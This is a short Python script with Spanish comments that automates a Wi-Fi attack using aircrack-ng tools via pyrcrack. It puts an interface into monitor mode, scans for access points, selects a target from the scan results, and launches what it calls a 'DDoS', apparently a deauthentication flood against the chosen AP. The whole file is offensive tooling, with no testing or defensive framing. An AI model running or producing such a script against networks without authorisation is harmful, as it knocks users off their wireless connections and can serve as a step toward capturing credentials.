# Dep
import asyncio
from rich.console import Console
from rich.prompt import Prompt
import pyrcrack
import subprocess as sp
import os
# Local
import wifi_class as wifi
from csv_handler import csv_handler


async def main():

    interface = 'wlp2s0'

    # Primera parte: Configurar tarjeta en modo monitor
    airmon = wifi.Airmon(interface)
    try:
        await airmon.monitor_mode()
    except:
        print('[Nombre de interfaz mal escrito o ya esta en modo monitor]')

    # Segunda parte: Iniciar el escaneo para detectar todas las APs disponibles
    airodump = wifi.Airodump(interface+'mon')
    print('[Escaneo de APs iniciando...]')
    print('[ctl + c para salir]')
    try:
        airodump.general_scan()
    except:
        pass
    option = csv_handler('general_scan-01.csv')
    os.system('rm general_scan-01.csv')
    target = {
        'AP_MAC': option[0],
        'Channel': option[1].strip(),
        'Privacy': option[3],
        'Cipher': option[4],
        'Authetication': option[5],
    }

    # Tercera parte: Iniciar escaneo del canal del AP escogido
    aireplay = wifi.Aireplay(target, interface)
    await airodump.channel_scan(target['Channel'])
    await aireplay.DDoS()
    os.system('airmon-ng stop wlp2s0mon')


asyncio.run(main())
